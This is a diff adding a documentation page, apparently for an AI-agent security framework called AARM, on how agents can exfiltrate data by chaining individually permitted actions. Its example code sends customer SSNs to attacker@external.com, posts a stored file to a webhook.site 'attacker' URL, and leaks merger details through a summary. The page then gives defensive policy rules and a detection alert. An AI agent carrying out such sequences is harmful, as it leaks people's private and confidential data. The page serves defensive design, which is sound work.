@@ -1,0 +1,263 @@
+---
+title: "Data Exfiltration"
+description: "Individual actions satisfy policy while their composition constitutes unauthorized data theft."
+---
+
+## Overview
+
+Data exfiltration via composition is one of the most insidious threats to AI agents. Each action in isolation appears legitimate and passes policy checks. Only when viewed together does the violation become apparent.
+```
+Action 1: db.query("SELECT * FROM customers")     
+  → ALLOW (user has read access to customers table)
+
+Action 2: email.send(to="analyst@partner.com", body=query_results)
+  → ALLOW (user can send email to partners)
+
+Composition: Customer PII sent to external party
+  → POLICY VIOLATION
+```
+
+Traditional security evaluates actions independently. AARM must reason about **sequences** and **data flow**.
+
+---
+
+## Attack Pattern
+
+<Steps>
+  <Step title="Access">
+    Agent retrieves sensitive data through legitimate read operations
+  </Step>
+  <Step title="Transform">
+    Data passes through model context—may be summarized, reformatted, or embedded in other content
+  </Step>
+  <Step title="Exfiltrate">
+    Agent sends data externally through legitimate communication channels
+  </Step>
+</Steps>
+
+At no point does the agent do anything it's not permitted to do. The violation is the **combination**.
+
+---
+
+## Attack Variants
+
+### Direct Exfiltration
+
+Data retrieved and immediately sent:
+```python
+# Action sequence
+results = db.query("SELECT ssn, name, address FROM customers")
+email.send(
+    to="attacker@external.com",
+    subject="Customer Report",
+    body=format_as_csv(results)
+)
+```
+
+### Staged Exfiltration
+
+Data gathered across multiple sessions or stored intermediately:
+```python
+# Session 1
+customers = db.query("SELECT * FROM customers WHERE region='US'")
+file.write("/tmp/report.csv", customers)
+
+# Session 2 (different context)
+report = file.read("/tmp/report.csv")
+http.post("https://webhook.site/attacker", body=report)
+```
+
+### Summarization Laundering
+
+Sensitive data embedded in "summaries" that appear innocuous:
+```python
+# Read sensitive document
+doc = file.read("/confidential/merger_plans.pdf")
+
+# Create "summary" that includes key details
+summary = model.summarize(doc)  # Contains acquisition target, price, timeline
+
+# Send summary externally
+slack.post(channel="#public-updates", message=summary)
+```
+
+### Tool Chain Exfiltration
+
+Data passed through multiple tools, each legitimate:
+```python
+# Read internal data
+data = internal_api.get("/employee/salaries")
+
+# "Analyze" with external tool
+analysis = external_analytics.process(data)  # Data now on external server
+
+# Get results back
+results = external_analytics.get_results()
+```
+
+The data left your control at step 2, regardless of what happens after.
+
+---
+
+## The Transformation Problem
+
+<Warning>
+Data flow through an LLM context window creates a **transformation boundary** that makes tracking difficult. Data goes in structured, comes out as natural language, potentially summarized, paraphrased, or embedded in unrelated content.
+</Warning>
+
+| Input | Output | Challenge |
+|-------|--------|-----------|
+| `{"ssn": "123-45-6789"}` | "The customer's social security number is 123-45-6789" | Format change |
+| Full document | 3-sentence summary | Information compression |
+| 10,000 records | "Analysis shows 40% are in California" | Aggregation |
+| Table + question | Natural language answer | Context embedding |
+
+Tracking data lineage through these transformations is an **open research problem**.
+
+---
+
+## AARM Mitigations
+
+### Data Classification in Policy
+
+Tag data at read time, enforce at send time:
+```yaml
+rules:
+  - name: tag-pii-on-read
+    match:
+      tool: db.query
+      parameters.table: [customers, employees, patients]
+    effect:
+      set_context:
+        data_classification: PII
+
+  - name: block-pii-to-external
+    match:
+      tool: [email.send, http.post, slack.post]
+      parameters.destination: { external: true }
+      context.data_classification: PII
+    action: DENY
+    reason: "Cannot send PII to external destinations"
+```
+
+### Destination Allowlists
+
+Restrict where data can be sent:
+```yaml
+rules:
+  - name: external-communication-allowlist
+    match:
+      tool: [email.send, http.post]
+      parameters.destination: { external: true }
+    constraints:
+      parameters.destination:
+        domain_allowlist: 
+          - "trusted-partner.com"
+          - "approved-vendor.org"
+    action: DENY
+    reason: "Destination not in approved list"
+```
+
+### Session-Level Data Tracking
+
+Monitor what sensitive data has been accessed in a session:
+```yaml
+rules:
+  - name: block-external-after-sensitive-read
+    match:
+      tool: { category: external_communication }
+      context.session_accessed_data: { contains: [CONFIDENTIAL, RESTRICTED] }
+    action: STEP_UP
+    reason: "External communication after accessing sensitive data requires approval"
+```
+
+### Volumetric Controls
+
+Limit bulk data movement:
+```yaml
+rules:
+  - name: limit-bulk-export
+    match:
+      tool: db.query
+      parameters.limit: { gt: 100 }
+    action: MODIFY
+    modification:
+      parameters.limit: 100
+    reason: "Query results capped at 100 rows"
+
+  - name: rate-limit-external-sends
+    match:
+      tool: { category: external_communication }
+    constraints:
+      rate: 
+        max: 10
+        window: 3600  # per hour
+    action: DENY
+    reason: "External communication rate limit exceeded"
+```
+
+### Telemetry for Detection
+
+Even if real-time blocking isn't possible, detection enables response:
+```json
+{
+  "alert": "potential_exfiltration",
+  "pattern": "sensitive_read_then_external_send",
+  "actions": [
+    {"tool": "db.query", "table": "customers", "rows": 5000},
+    {"tool": "email.send", "to": "external@domain.com", "size_bytes": 245000}
+  ],
+  "time_delta_seconds": 45,
+  "risk_score": 0.89
+}
+```
+
+---
+
+## Limitations
+
+<Info>
+Compositional data exfiltration is a **partially solved problem** in AARM. Full solutions require:
+
+- Data lineage tracking through model transformations
+- Semantic understanding of what information is "equivalent"
+- Taint analysis that survives summarization/paraphrasing
+
+AARM provides significant risk reduction through classification, allowlists, and volumetric controls, but cannot guarantee prevention of all exfiltration paths.
+</Info>
+
+---
+
+## Defense Layers
+
+| Layer | Control | Coverage |
+|-------|---------|----------|
+| **Classification** | Tag sensitive data at read | Explicit sensitive sources |
+| **Destination** | Allowlist external endpoints | Known-good destinations |
+| **Volumetric** | Limit bulk operations | Large-scale exfil |
+| **Session** | Track data accessed in session | Within-session composition |
+| **Anomaly** | Detect unusual patterns | Novel exfil methods |
+| **Telemetry** | Alert on suspicious sequences | Post-hoc detection |
+
+Defense in depth: no single control catches everything, but layers reduce risk significantly.
+
+---
+
+## References
+
+- Tang et al. (2024). "Prioritizing Safeguarding Over Autonomy: Risks of LLM Agents for Science"
+- Ruan et al. (2024). "The Emerged Security and Privacy of LLM Agent: A Survey with Case Studies"
+- OWASP. "LLM06: Sensitive Information Disclosure"
+
+---
+
+## Next
+
+<CardGroup cols={2}>
+  <Card title="Threat Model Overview" icon="shield" href="/threats/overview">
+    Return to threat model summary
+  </Card>
+  <Card title="Action Receipts" icon="receipt" href="/components/receipts">
+    How AARM creates forensic audit trails
+  </Card>
+</CardGroup>
